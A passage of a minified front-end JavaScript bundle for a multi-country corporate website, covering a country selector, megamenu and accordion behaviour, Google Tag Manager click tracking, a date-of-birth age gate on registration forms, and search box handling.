r=document.documentElement.lang.toLowerCase();country="es-ar"===r||"ar"===r?"Argentina":"en-au"===r||"au"===r?"Australia":"es-co"===r||"co"===r?"Colombia":"es-mx"===r||"mx"===r?"Mexico":"en-gb"===r||"gb"===r?"United Kingdom":"hu-hu"===r||"hu"===r?"Hungary":"en-nz"===r||"nz"===r?"New Zealand":"es-pr"===r||"pr"===r?"Puerto Rico":"de-at"===r||"at"===r?"Österreich":"nl-be"===r||"fr-be"===r||"be"===r?"Belgien":"pt-br"===r||"br"===r?"Brasil":"en-ca"===r||"ca"===r||"fr-ca"===r?"Canada":"ar-lb"===r||"lb"===r?"لبنان":"ko-ko"===r||"ko"===r?"Korea":"de-de"===r||"de"===r?"Deutschland":"gu-in"===r||"in"===r?"भारत":"en-ie"===r||"ie"===r?"Ireland":"it-it"===r||"it"===r?"Italia":"ja-jp"===r||"jp"===r?"日本":"ur-pk"===r||"pk"===r?"پاکستان":"pt-pt"===r||"pt"===r?"Portugal":"ro-ro"===r||"ro"===r?"România":"ar-sa"===r||"sa"===r?"المملكة العربية السعودية":"en-za"===r||"za"===r?"Sauth Africa":"es-es"===r||"es"===r?"España":"th-th"===r||"th"===r?"ประเทศไทย":"ar-ae"===r||"ae"===r?"الإمارات العربية المتحدة":"en-uk"===r||"uk"===r?"United Kingdom":"en-us"===r||"us"===r?"United States of America":"zh-cn"===r||"cn"===r?"中国":"nl-nl"===r||"nl"===r?"Nederland":"fr-fr"===r||"fr"===r?"France":"fr-ch"===r||"de-ch"===r||"ch"===r?"Schweiz":"zh-tw"===r||"tw"===r?"Taiwan":"Select country",n(".country-selected").html(country+'<span class="chevron-down"></span>'),n('.country-dropdown option[value="'+country+'"]').attr("selected","selected")}))},function(t,e){t.exports=Object.is||function(t,e){return t===e?0!==t||1/t==1/e:t!=t&&e!=e}},function(t,e){!function(t){var e,n=this,r=t(".megamenu-nav-container");t(document).ready((function(){r=t(".megamenu-nav-container"),dockedNav=t(".simple-navigation.navigation-docked, .megamenu-navigation.navigation-docked").length>0})).on("scroll",(function(a){var i=t(n).scrollTop();i>e&&!dockedNav?r.addClass("sticked-js"):i<=e&&r.removeClass("sticked-js")})),t(window).on("resize",(function(t){try{e=r.offset().top}catch(t){}}))}(Cog.jQuery())},function(t,e,n){"use strict";var r=n(3),a=n(39),i=n(14),o=n(2),s=[].sort,c=[1,2,3];r(r.P+r.F*(o((function(){c.sort(void 0)}))||!o((function(){c.sort(null)}))||!n(48)(s)),"Array",{sort:function(t){return void 0===t?s.call(i(this)):s.call(i(this),a(t))}})},function(t,e){var n;(n=Cog.jQuery())(document).ready((function(t){(-1!==navigator.appVersion.indexOf("MSIE 10")||window.MSInputMethodContext&&document.documentMode)&&n('img[src$="svg"]').css({width:"100%"})}))},function(t,e,n){"use strict";var r=n(7),a=n(13),i=n(20),o=n(60),s=n(33),c=n(2),l=n(36).f,u=n(43).f,d=n(8).f,f=n(112).trim,h=r.Number,p=h,m=h.prototype,v="Number"==i(n(52)(m)),g="trim"in String.prototype,y=function(t){var e=s(t,!1);if("string"==typeof e&&e.length>2){var n,r,a,i=(e=g?e.trim():f(e,3)).charCodeAt(0);if(43===i||45===i){if(88===(n=e.charCodeAt(2))||120===n)return NaN}else if(48===i){switch(e.charCodeAt(1)){case 66:case 98:r=2,a=49;break;case 79:case 111:r=8,a=55;break;default:return+e}for(var o,c=e.slice(2),l=0,u=c.length;l<u;l++)if((o=c.charCodeAt(l))<48||o>a)return NaN;return parseInt(c,r)}}return+e};if(!h(" 0o1")||!h("0b1")||h("+0x1")){h=function(t){var e=arguments.length<1?0:t,n=this;return n instanceof h&&(v?c((function(){m.valueOf.call(n)})):"Number"!=i(n))?o(new p(y(e)),n,h):y(e)};for(var b,w=n(5)?l(p):"MAX_VALUE,MIN_VALUE,NaN,NEGATIVE_INFINITY,POSITIVE_INFINITY,EPSILON,isFinite,isInteger,isNaN,isSafeInteger,MAX_SAFE_INTEGER,MIN_SAFE_INTEGER,parseFloat,parseInt,isInteger".split(","),C=0;w.length>C;C++)a(p,b=w[C])&&!a(h,b)&&d(h,b,u(p,b));h.prototype=m,m.constructor=h,n(10)(r,"Number",h)}},function(t,e,n){var r=n(3),a=n(22),i=n(2),o=n(113),s="["+o+"]",c=RegExp("^"+s+s+"*"),l=RegExp(s+s+"*$"),u=function(t,e,n){var a={},s=i((function(){return!!o[t]()||"​"!="​"[t]()})),c=a[t]=s?e(d):o[t];n&&(a[n]=c),r(r.P+r.F*s,"String",a)},d=u.trim=function(t,e){return t=String(a(t)),1&e&&(t=t.replace(c,"")),2&e&&(t=t.replace(l,"")),t};t.exports=u},function(t,e){t.exports="\t\n\v\f\r   ᠎             　\u2028\u2029\ufeff"},function(t,e,n){"use strict";n(115)("link",(function(t){return function(e){return t(this,"a","href",e)}}))},function(t,e,n){var r=n(3),a=n(2),i=n(22),o=/"/g,s=function(t,e,n,r){var a=String(i(t)),s="<"+e;return""!==n&&(s+=" "+n+'="'+String(r).replace(o,"&quot;")+'"'),s+">"+a+"</"+e+">"};t.exports=function(t,e){var n={};n[t]=e(s),r(r.P+r.F*a((function(){var e=""[t]('"');return e!==e.toLowerCase()||e.split('"').length>3})),"String",n)}},function(t,e,n){var r=n(3),a=n(65)(!1);r(r.S,"Object",{values:function(t){return a(t)}})},function(t,e,n){},function(t,e,n){"use strict";n.r(e);var r;n(72),n(19),n(11),n(4),n(35);(r=Cog.jQuery())(document).ready((function(t){r('[class*="data-attr-"]').each((function(t,e){var n=r(e),a=n.attr("class");r(a.split(" ")).each((function(t,e){var r,i,o,s=e.match(/data\-attr\-name\-([^ ]+)/gi);Array.isArray(s)&&(r=s[0].replace("data-attr-name-",""),i=new RegExp("data-attr-value-".concat(r,"-([^ ]+)"),"ig"),o=a.match(i)[0].replace("data-attr-value-".concat(r,"-"),"").replace(/__/gim," "),n.attr("data-".concat(r),o))})),n.attr({class:a.replace(/data\-attr[^ ]+/gi,"").replace(/\s{2,}/gi,"")})}))}));n(1),n(82),n(17),n(37);!function(t){window.camelize=function(t){try{return t.replace(/^([A-Z])|[\s-_\.]+(\w)/g,(function(t,e,n,r){return n?n.toUpperCase():e.toLowerCase()}))}catch(t){return""}},window.generateID=function(t,e){try{var n="a,b,c,d,e,f,g,h,ch,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z".split(",");return t=!t||"string"!=typeof t&&"number"!=typeof t?n[Math.floor(Math.random()*(n.length-0)+0)]:t,e=!e||"string"!=typeof e&&"number"!=typeof e?"":e,"".concat(t).concat((new Date).getTime()).concat(e).replace(/\ /g,"").replace(/\b\d+/gi,"")}catch(t){return!1}},window.timeStriToMs=function(t){try{if(!/^[\d\.]{1,}(s|ms)$/gi.test(t))return null;var e="s"===t.match(/(s|ms)$/gi)[0]?1e3:1;return parseFloat(t)*e}catch(t){return console.warn(t),null}},window.hexToRgb=function(t){var e=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(t);return e?{r:parseInt(e[1],16),g:parseInt(e[2],16),b:parseInt(e[3],16)}:{r:0,g:0,b:0}},window.accordionHeight=function(e){try{clearTimeout(window.accordionHeightTimeout)}catch(t){}window.accordionHeightTimeout=setTimeout((function(){t(e=arguments.length>0?e:".accordion-content-wrapper").each((function(e,n){var r,a=t(n),i=".accordion-slide.is-active #".concat(n.id," {\n        max-height: {{maxheight}}px\n      }\n        .accordion-slide:focus-within #").concat(n.id," {\n        max-height: {{maxheight}}px\n      }"),o=t("<style/>");r=a.get(0).scrollHeight,i=i.replace(/\{\{maxheight\}\}/gi,r),o.text(i),a.closest(".accordion-slide").find(" > style").remove(),a.before(o)}))}),100)},t("body").on("mouseup",(function(e){var n=t(e.target);n.is("form *:not(button), input, textarea, select, [contenteditable]")||n.trigger("blur")}))}(Cog.jQuery()),Array.prototype.unique=function(){return this.filter((function(t,e,n){return n.indexOf(t)===e}))},Array.prototype.removeEmptyStrings=function(){return this.filter((function(t,e,n){return/\b ?$/g.test(t.toString())}))};n(84);window.offset=function(t){return{left:t.getBoundingClientRect().left+window.scrollX,top:t.getBoundingClientRect().top+window.scrollY}},window.bpHashChangeHandler=function(t){try{var e,n,r=decodeURIComponent(window.location.hash),a=!!bpComponents.bpActions[r.replace(/#/g,"")],i=function(){try{return document.querySelectorAll(r).length>0}catch(t){return!1}}(),o=function(){try{var t=0;return document.querySelector('[class*="offsetscroll-"]').classList.forEach((function(e){e.indexOf("offsetscroll")>-1&&(t=e.split("-")[1])})),t}catch(t){return 0}}(),s=document.querySelector(window.innerWidth<768?".megamenu-bottom-center":".megamenu-nav-container").offsetHeight;if(a)try{t.preventDefault(),bpComponents.bpActions[r.replace(/#/g,"")]()}catch(t){console.warn(t)}i&&(t.preventDefault(),e=document.querySelector(r),n=offset(e),document.body.style.scrollBehavior=document.documentElement.style.scrollBehavior="smooth",document.documentElement.scrollTop=n.top-s-o)}catch(t){console.warn(t)}},window.bpComponents||(window.bpComponents={version:"2.6",getNavigationType:function(){try{var t=document.querySelectorAll(".simple-navigation").length>0,e=document.querySelectorAll(".megamenu-navigation").length>0,n=document.querySelectorAll(".megamenu-navigation.simple-navigation").length>0;return 0===document.querySelectorAll(".megamenu-navigation, .simple-navigation").length?"Not set":n?"Wrongly set (both)":t?"SimpleNavigation":e?"MegaNavigation":"Not set"}catch(n){return"Error getting info"}},switchNavigation:function(t){var e,n,r,a,i=window.bpComponents.getNavigationType();"MegaNavigation"===i&&(e=document.querySelector(".megamenu-navigation"),r="simple",n="megamenu"),"SimpleNavigation"===i&&(e=document.querySelector(".simple-navigation"),r="megamenu",n="simple"),"Not set"!==i&&"Wrongly set (both)"!==i&&"Error getting info"!==i||(e=document.querySelector(".reference-megamenu"),r=""),a=new RegExp(" ?".concat(n,"-navigation"),"g"),t=t||r,e.className="".concat(e.classList.toString().replace(a,"")," ").concat(t,"-navigation").replace(/ $/g,"")},componentsNameMap:{accordions:"Accordion     ",bpFilters:"Filter      ",bpTogglers:"Togglers      ",bpLoaders:"Content Loader",bpCarousels:"Carousel     ",bpSharers:"Sharer     ",bpShareContainers:"Share Container",bpVideoPlayers:"Video Player",tables:"Table       ",bpActions:"Action Component",rtRegContainers:"RevTrax Register Container"},accordions:{},bpFilters:{},bpLoaders:{},bpCarousels:{},bpFontResizer:{},bpSharers:{},bpShareContainers:{},bpVideoPlayers:{},tables:{},bpActions:{},rtRegContainers:{},bpMegaMenu:{},bpTogglers:{},bpTrackers:{},getUsedComponents:function(t){if(arguments.length>0&&"string"==typeof arguments[0]){/filter/gi.test(t)&&(t=".class-filter"),/toggler/gi.test(t)&&(t=".toggler-container"),/font|resizer/gi.test(t)&&(t=".bp-font-resizer"),/megamenu|menu|mega/gi.test(t)&&(t=".megamenu"),/player|video|videoplayer/gi.test(t)&&(t=".bpplayer"),/sharer|share|sharelink|social/gi.test(t)&&(t=".jv-share-link"),/filter|font|resizer|megamenu|menu|mega|player|video|videoplayer|sharer|share|sharelink|social|toggler/gi.test(t)||(t=".component.".concat(t));var e=document.querySelectorAll(t);return console.log(e),e}var n=["Registered custom components:"],r=["Ued CF components:","Box          \t\t\t\t".concat(document.querySelectorAll(".component.box").length),"Image        \t\t\t\t".concat(document.querySelectorAll(".component.image").length),"RichText     \t\t\t\t".concat(document.querySelectorAll(".component.richText").length),"Title        \t\t\t\t".concat(document.querySelectorAll(".component.title").length),"Breadcrumbs  \t\t\t\t".concat(document.querySelectorAll(".component.breadcrumbs").length),"Parametrized HTML\t\t\t".concat(document.querySelectorAll(".component.advancedParametrizedHtml, .component.parametrizedhtml").length),"Navigation  \t\t\t\t".concat(document.querySelectorAll(".component.navigation").length),"Snippet Reference\t\t\t".concat(document.querySelectorAll(".component.snippetReference").length)];for(i in this)this.hasOwnProperty(i)&&"componentsNameMap"!==i&&"getUsedComponents"!==i&&"bpFontResizer"!==i&&"version"!==i&&"isIE"!==i&&"ieVersion"!==i&&"bpMegaMenu"!==i&&Object.keys(this[i]).length>0&&this[i].constructor===Object&&n.push("".concat(this.componentsNameMap[i],"\t\t\t\t").concat(Object.keys(this[i]).length));console.log(this.bpMegaMenu.itemsCount>0?"Megamenu:     \t\t\t\t1\nMenu Items:     \t\t\t".concat(this.bpMegaMenu.itemsCount,"\nMenu Type:     \t\t\t\t").concat(this.getNavigationType(),"\nDropdowns:     \t\t\t\t").concat(this.bpMegaMenu.dropDowns,"\n\tused:     \t\t\t\t").concat(this.bpMegaMenu.dropDownsUsed,"\n\tunused:     \t\t\t").concat(this.bpMegaMenu.dropDownsUnUsed):"Megamenu:     \t\t\t\t0"),console.log(n.length<1?"No custom components are used":n.join("\n")),console.log(r.join("\n"))}},window.bpComponents.bpMegaMenu.navigationType=window.bpComponents.getNavigationType()),window.addEventListener("hashchange",bpHashChangeHandler,!0),window.addEventListener("load",(function(t){try{window.dispatchEvent(new HashChangeEvent("hashchange"))}catch(t){}}),!0);try{bpComponents.isIE=!1,bpComponents.ieVersion=null}catch(t){console.warn(t)}(window.getIeVersion=function(t){try{t=t||navigator.userAgent;var e=/\b(MSIE |Trident.*?rv:|Edge\/)(\d+)/.exec(t);if(e){var n=parseInt(e[2]),r=document.querySelector("html"),a=r.classList;return/browser-ie/i.test(a)||(r.className="".concat(a.toString()," browser-ie ie-").concat(n)),bpComponents.isIE||(bpComponents.isIE=!0,bpComponents.ieVersion=n),n}return!1}catch(t){console.warn(t)}})();n(86),n(87),n(88),n(90);var a,o,s={"°":"0","¹":"1","²":"2","³":"3","⁴":"4","⁵":"5","⁶":"6","⁷":"7","⁸":"8","⁹":"9","₀":"0","₁":"1","₂":"2","₃":"3","₄":"4","₅":"5","₆":"6","₇":"7","₈":"8","₉":"9","æ":"ae","ǽ":"ae","À":"A","Á":"A","Â":"A","Ã":"A","Å":"AA","Ǻ":"A","Ă":"A","Ǎ":"A","Æ":"AE","Ǽ":"AE","à":"a","á":"a","â":"a","ã":"a","å":"aa","ǻ":"a","ă":"a","ǎ":"a","ª":"a","@":"at","Ĉ":"C","Ċ":"C","Ç":"C","ç":"c","ĉ":"c","ċ":"c","©":"c","Ð":"Dj","Đ":"D","ð":"dj","đ":"d","È":"E","É":"E","Ê":"E","Ë":"E","Ĕ":"E","Ė":"E","è":"e","é":"e","ê":"e","ë":"e","ĕ":"e","ė":"e","ƒ":"f","Ĝ":"G","Ġ":"G","ĝ":"g","ġ":"g","Ĥ":"H","Ħ":"H","ĥ":"h","ħ":"h","Ì":"I","Í":"I","Î":"I","Ï":"I","Ĩ":"I","Ĭ":"I","Ǐ":"I","Į":"I","Ĳ":"IJ","ì":"i","í":"i","î":"i","ï":"i","ĩ":"i","ĭ":"i","ǐ":"i","į":"i","ĳ":"ij","Ĵ":"J","ĵ":"j","Ĺ":"L","Ľ":"L","Ŀ":"L","ĺ":"l","ľ":"l","ŀ":"l","Ñ":"N","ñ":"n","ŉ":"n","Ò":"O","Ó":"O","Ô":"O","Õ":"O","Ō":"O","Ŏ":"O","Ǒ":"O","Ő":"O","Ơ":"O","Ø":"OE","Ǿ":"O","Œ":"OE","ò":"o","ó":"o","ô":"o","õ":"o","ō":"o","ŏ":"o","ǒ":"o","ő":"o","ơ":"o","ø":"oe","ǿ":"o","º":"o","œ":"oe","Ŕ":"R","Ŗ":"R","ŕ":"r","ŗ":"r","Ŝ":"S","Ș":"S","ŝ":"s","ș":"s","ſ":"s","Ţ":"T","Ț":"T","Ŧ":"T","Þ":"TH","ţ":"t","ț":"t","ŧ":"t","þ":"th","Ù":"U","Ú":"U","Û":"U","Ü":"U","Ũ":"U","Ŭ":"U","Ű":"U","Ų":"U","Ư":"U","Ǔ":"U","Ǖ":"U","Ǘ":"U","Ǚ":"U","Ǜ":"U","ù":"u","ú":"u","û":"u","ü":"u","ũ":"u","ŭ":"u","ű":"u","ų":"u","ư":"u","ǔ":"u","ǖ":"u","ǘ":"u","ǚ":"u","ǜ":"u","Ŵ":"W","ŵ":"w","Ý":"Y","Ÿ":"Y","Ŷ":"Y","ý":"y","ÿ":"y","ŷ":"y"},c={arabic:["ar-lb","lb","ar-sa","sa","ar-ae","ae"],armenian:[],austrian:["de-at","at"],azerbaijani:[],bulgarian:[],burmese:[],chinese:["zh-cn","cn","zh-tw","tw"],croatian:[],czech:[],danish:[],default:[],esperanto:[],estonian:[],finnish:[],french:[],georgian:[],german:["de-de","de","de-ch","ch"],greek:[],hindi:[],hungarian:[],italian:[],latvian:[],lithuanian:[],macedonian:[],norwegian:[],persian:[],polish:[],"portuguese-brazil":["pt-br","br","pt-pt","pt"],romanian:[],russian:[],serbian:[],slovak:[],swedish:[],turkish:[],thai:[],turkmen:[],ukrainian:[],vietnamese:[]};(a=[],null==(o=document.documentElement.getAttribute("lang"))?[]:(o=o.toLowerCase(),Object.entries(c).forEach((function(t,e){var n=t[0];(Array.isArray(t[1])?t[1].join(",").toLowerCase().split(","):[]).indexOf(o)>-1&&a.push("".concat(n,".lng"))})),a)).forEach((function(t){var e=new XMLHttpRequest,n=document.body.dataset.themePath;e.onreadystatechange=function(t){if(4===t.currentTarget.readyState){var e=JSON.parse(t.currentTarget.response);Object.assign(s,e)}},e.open("get","".concat(n,"/assets/languages/").concat(t),!0),e.send()}));var l,u,d,f=function t(){return function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,t),function(e){return"string"!=typeof e?"":(n="",e.split("").forEach((function(e){/[abcdefghijklmnopqrstuvwxyz0123456789\-_]/gim.test(e)?n+=e:t.map.hasOwnProperty(e)&&"string"==typeof t.map[e]?n+=t.map[e]:n+="-"})),n.toLowerCase().replace(/\s/gi,"-"));var n}};d=s,(u="map")in(l=f)?Object.defineProperty(l,u,{value:d,enumerable:!0,configurable:!0,writable:!0}):l[u]=d,window.slug=new f,function(t){function e(e){var n=t(e.currentTarget).find("a[href]"),r=n.attr("href");e.ctrlKey?window.open(r,"_blank"):n.hasClass("lightbox")?n.trigger("click"):window.location.href=r}t((function(){t(".clickable-box").on("mouseenter",(function(e){t(e.currentTarget).css("cursor","pointer")})).on("mouseleave",(function(e){t(e.currentTarget).css("cursor","")})).on("mousedown",(function(n){if(3!==n.which&&2!==n.button){t(n.currentTarget).on("mouseup",e);setTimeout((function(){t(n.currentTarget).off("mouseup",e)}),200)}}))}))}(Cog.jQuery()),function(t){var e=function(e){var n=this;if(e){this.trackers={};var r="$id,$dataEvent,$dataEventCategory,$dataEventAction,$dataEventTrigger,$dataEventLabel,$dataEventTarget,$dataEventTargetParentSelector,$dataEventTargetSharerSelector,$dataEventTargetChildSelector,$dataEventDelay,$dataEventAnchorDelay".split(","),a=function(e,n){if(!e||arguments.length<2||null===e)return"";var r=n,a={text:(e=e instanceof t?e:t(e)).text(),link:e.attr("href"),fullInternalLink:"".concat(window.location.protocol,"://").concat(window.location.hostname).concat(e.attr("href")),pageUrl:window.location.href,hostName:window.location.hostname,rootUrl:"".concat(window.location.protocol,"://").concat(window.location.hostname),sharerText:e.data("data-sharer")?e.data("data-sharer").text():"",parentText:e.data("data-parent")?e.data("data-parent").text():"",childText:e.data("data-child")?e.data("data-child").text():"",childLink:e.data("data-child")?e.data("data-child").attr("href"):""};for(var i in a)if(a.hasOwnProperty(i)){var o=new RegExp("{{".concat(i,"}}"),"ig");r=r.replace(o,a[i])}return r};t(e).each((function(e,a){var i=t(a);r.forEach((function(t,e){var n=t,r=i.get(0).attributes;for(var a in r)r[a].value&&r[a].value===n&&(r[a].value="")}));var o=i.attr("id");""!==o?n.trackers[o]={dataEvent:i.attr("data-event"),dataEventCategory:i.attr("data-event-category"),dataEventAction:i.attr("data-event-action"),dataEventTrigger:i.attr("data-event-trigger"),dataEventLabel:i.attr("data-event-label"),dataEventTarget:i.attr("data-event-target"),dataEventTargetClosestParentSelector:i.attr("data-event-target-parent-selector"),dataEventTargetSharerSelector:i.attr("data-event-target-sharer-selector"),dataEventTargetChildSelector:i.attr("data-event-target-child-selector"),dataEventDelay:parseInt(i.attr("data-event-delay")),dataEventAnchorDelay:parseInt(i.attr("data-event-anchor-delay")),debug:Function("return ".concat(i.attr("data-debug")))()}:console.warn("No trackerId specified. Skipping this tracker!")}));var i=function(e){var r=n.trackers[e];t("body").on(r.dataEventTrigger,(function(e){var n=t(e.target);if(n.is("".concat(r.dataEventTarget,", ").concat(r.dataEventTarget," *"))){var i=n.is("a"),o=!!i&&n.attr("href");!i||n.target("_blank")||n.rel("noopener noreferrer")||e.preventDefault(),setTimeout((function(){if(n=n.closest("".concat(r.dataEventTarget)),""!==r.dataEventTargetClosestParentSelector&&n.closest("".concat(r.dataEventTargetClosestParentSelector)).length>0?n.data({"data-parent":n.closest("".concat(r.dataEventTargetClosestParentSelector)).eq(0),"data-sharer":n.closest("".concat(r.dataEventTargetClosestParentSelector)).find("".concat(r.dataEventTargetSharerSelector)).length>0&&n.closest("".concat(r.dataEventTargetClosestParentSelector)).find("".concat(r.dataEventTargetSharerSelector)).eq(0),"data-child":n.find("".concat(r.dataEventTargetChildSelector)).length>0&&n.find("".concat(r.dataEventTargetChildSelector)).eq(0)}):n.data({"data-parent":!1,"data-sharer":!1,"data-child":n.find("".concat(r.dataEventTargetChildSelector)).length>0&&n.find("".concat(r.dataEventTargetChildSelector)).eq(0)}),r.debug){console.log(a(n,"\n                dataLayer.push({\n                  'event':'".concat(r.dataEvent,"',\n                  'eventCategory': '").concat(r.dataEventCategory,"',\n                  'eventAction':'").concat(r.dataEventAction,"',\n                  'eventLabel':'").concat(r.dataEventLabel,"'\n                });\n              ")));try{dataLayer.push({event:a(n,r.dataEvent),eventCategory:a(n,r.dataEventCategory),eventAction:a(n,r.dataEventAction),eventLabel:a(n,r.dataEventLabel)})}catch(t){console.warn(t)}}else{try{dataLayer.push({event:a(n,r.dataEvent),eventCategory:a(n,r.dataEventCategory),eventAction:a(n,r.dataEventAction),eventLabel:a(n,r.dataEventLabel)})}catch(t){console.warn(t)}i&&o&&("click"===r.dataEventTrigger||"tap"===r.dataEventTrigger)&&setTimeout((function(){location.href=o}),r.dataEventAnchorDelay)}}),r.dataEventDelay)}}))};for(var o in this.trackers)i(o)}else console.warn("No trackersConfigSelector provided! Aborting!")};t(document).ready((function(t){window.gtmtrack=new e(".gtm-tracker-configurator")}))}(Cog.jQuery());n(91),n(50),n(53),n(38),n(54),n(100),n(55),n(69);function h(t){return(h="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(t)}function p(t){return function(t){if(Array.isArray(t))return m(t)}(t)||function(t){if("undefined"!=typeof Symbol&&null!=t[Symbol.iterator]||null!=t["@@iterator"])return Array.from(t)}(t)||function(t,e){if(!t)return;if("string"==typeof t)return m(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);"Object"===n&&t.constructor&&(n=t.constructor.name);if("Map"===n||"Set"===n)return Array.from(t);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return m(t,e)}(t)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function m(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}window.BPIntervals=[];var v=function(t,e,n,r){var a=this;return window._focused=!0,this.remaining=e,this.id="Interval".concat((new Date).getTime()),this.visible=!0,this.resumed=!1,this.elapsed=0,this.paused=!1,this._pausedOn=0,this._resumedOn=0,this._pausedFor=0,this.once=r||!1,this.onUpdate=function(){},this._private_interval=function(r){if(a.elapsed<e)void 0===a.started&&(a.started=r),a.elapsed=r-a._pausedFor-a.started,a.remaining=e-a.elapsed,a.resumed=!1,a.visible=!0;else{if(a.once){var i=[a.started],o=Array.isArray(n)?[].concat(i,p(n)):i;return"function"==typeof t&&t.apply(a,o),window._Intervals[a.id]=null,void delete window._Intervals[a.id]}a.oldTimeStamp=0,a._pausedFor=0,a._resumedOn=0,a._pausedOn=0,a.remaining=e,a.started=r,a.estimatedEnd=a.started+e,a.elapsed=0;var s=[a.started],c=Array.isArray(n)?[].concat(s,p(n)):s;"function"==typeof t&&t.apply(a,c)}a.paused&&a.visible||("function"==typeof a.onUpdate&&a.onUpdate({remaining:a.remaining,visible:a.visible,resumed:a.resumed,elapsed:a.elapsed,paused:a.paused,interval:e}),window.requestAnimationFrame(a._private_interval))},window.requestAnimationFrame(this._private_interval),window.BPIntervals=Array.isArray(window.BPIntervals)?[].concat(p(window.BPIntervals),[this]):[this],"object"!==h(window._Intervals)&&(window._Intervals={}),window._Intervals[this.id]=this,this};v.prototype.pause=function(){this._pausedOn=(new Date).getTime(),this.paused=!0},v.prototype.resume=function(){this._resumedOn=(new Date).getTime(),this._pausedFor+=this._resumedOn-this._pausedOn,this.paused=!1,this.resumed=!0,window.requestAnimationFrame(this._private_interval)},window.addEventListener("focus",(function(){try{window._focused=!0,window.BPIntervals.forEach((function(t,e){t.visible=!0,t.resume()}))}catch(t){}})),window.addEventListener("blur",(function(){try{window._focused=!1,window.BPIntervals.forEach((function(t,e){t.visible=!1,t.pause()}))}catch(t){}})),function(t){t((function(){t('[class*="g-dob-"]').each((function(e,n){var r=t(n);0===r.find("> .gigya-raas.initialized").length&&(n.dobInit=setInterval((function(){r.find("> .gigya-raas.initialized").length>0&&(setTimeout((function(){!function(e){var n=t(e),r=n.prop("class"),a=r.match(/g\-dob\-(\d{1,2})/im),i=null!==a&&a[1]-1,o="number"==typeof i&&i>-1?n.find('input[type="date"]').eq(i):null,s=18;null!==o&&o.length&&o.length>0&&(s=n.is('[class*="g-dob-y-"]')?parseInt(r.match(/g\-dob\-y\-(\d{1,3})/im)[1]):18,s=isNaN(s)?18:s,o.attr({dob:!0,"data-valid-age":s}),n.find('input[type="submit"]').attr("disabled",!0))}(n)}),1e3),clearInterval(n.dobInit))})))})),t("body").on("change",(function(e){try{var n,r,a,i,o,s,c=t(e.target);if(c.is("input[dob]")){if(n=c.closest(".gigya-raas.initialized"),a=c.data("valid-age"),r=n.find('input[type="submit"]'),i=new Date(c.val()).getTime(),isNaN(i))return;o=new moment((new Date).getTime()),s=new moment(i),o.diff(s,"years").toObject().years>=a?r.removeAttr("disabled"):r.attr("disabled",!0)}}catch(t){console.warn(t)}}))}))}(Cog.jQuery()),function(t){t(document).ready((function(e){if(t((function(){accordionHeight(),t(document).ajaxComplete((function(){setTimeout(accordionHeight,10)})),t("body").on("click",(function(e){var n=t(e.target);n.is(".accordion-content-wrapper, .accordion-content-wrapper *")||n.is(".accordion-slide, .accordion-slide *")&&(e.preventDefault(),e.stopPropagation(),(n=n.closest(".accordion-slide")).closest(".accordion").is(".slide-to-active")&&n.find(".accordion-content-wrapper").one("transitionend",(function(e){if("max-height"===e.originalEvent.propertyName||"maxHeight"===e.originalEvent.propertyName){var r=t(window).width()<992?".megamenu-bottom-center":".megamenu-main-nav",a=n.offset().top-t(r).height()-10;t("body,html").stop().animate({scrollTop:a},"fast",null)}})),n.closest(".accordion").find(".is-active").not(n).removeClass("is-active").trigger("blur").find("*").trigger("blur"),n.is(".is-active")?(n.removeClass("is-active"),n.trigger("blur").find("*").trigger("blur")):n.addClass("is-active"))}))})),!bpComponents.isIE){var n=t(".accordion-content-wrapper"),r=new(window.MutationObserver||window.WebKitMutationObserver)((function(t){var e=!1;t.forEach((function(t){"childList"===t.type&&(e=!0)})),e&&setTimeout(accordionHeight,100)})),a={childList:!0,characterData:!0,attributes:!0,subtree:!0};n.each((function(){r.observe(this,a)}))}t(window).on("load",(function(){t(window).on("resize",(function(t){accordionHeight()}))}))}))}(Cog.jQuery());n(106),n(70);!function(t){t(document).ready((function(){if(t(".searchBox .form-search .search-query").val(""),0!==t("body.page-search-results").length){var e=t(".search-page-form .form-search .search-query");if(e.length>0){var n=new URL(window.location.href),r=new URLSearchParams(n.search);e.val(r.get("q"))}}})),t(".search-block .form-search button").click((function(e){e.preventDefault();var n=t(this).closest(".search-block");if(screen.width>=992)n.addClass("is-open"),""!==n.find(".search-query").val()&&n.find(".form-search").submit();else if(screen.width<992){var r=t(".searchBox button[type=submit]"),a=t(".navigation-mobile-menu");t(".megamenu").removeClass("nav-opened").toggleClass("search-opened"),t("body").removeClass("no-scrolling"),r.toggleClass("opened"),a.removeClass("opened"),""!==n.find(".search-query").val()&&n.find(".form-search").submit()}})),t(document).click((function(e){t(e.target).closest(".form-search").length||(t(".search-block").removeClass("is-open"),t(".search-block .search-query").val(""))}))}(Cog.jQuery()),function(t){t(document).ready((function(){t(".megamenu-main-nav li.is-active").addClass("current-js"),function(){var e=".megamenu-main-nav > .component-content > ul > li.navigation-item, .megamenu-main-nav > .component-content > ul > li.navigation-item *";function n(){t(".megamenu-submenu-item.opened").removeClass("opened").off("mouseout.onetime",n),t(".megamenu-main-nav > .component-content > ul > li.is-active").removeClass("is-active")}t("body").on("mouseover",(function(r){var a=t(r.target),i=a.is(e),o=a.is(".megamenu-submenu-item, .megamenu-submenu-item *");if(i){t(".megamenu-submenu-item.opened").removeClass("opened"),(a=a.closest("li.navigation-item")).addClass("is-active");var s=a.find("> a").attr("title"),c=slug(s),l=t(".megamenu-submenu-item.content-".concat(c));l.addClass("opened").one("mouseout.onetime",n),l.attr("data-link-title",s)}if(o){var u=(a=a.closest(".megamenu-submenu-item")).attr("data-link-title");try{t('li.navigation-item > a[title="'.concat(u,'" i]')).parent().addClass("is-active"),a.addClass("opened")}catch(r){t('li.navigation-item > a[title="'.concat(u,'"]')).parent().addClass("is-active"),a.addClass("opened")}}})).on("mouseout",(function(r){var a=t(r.target),i=a.is(e),o=a.is(".megamenu-submenu-item, .megamenu-submenu-item *");(i||o)&&n()}))}();var 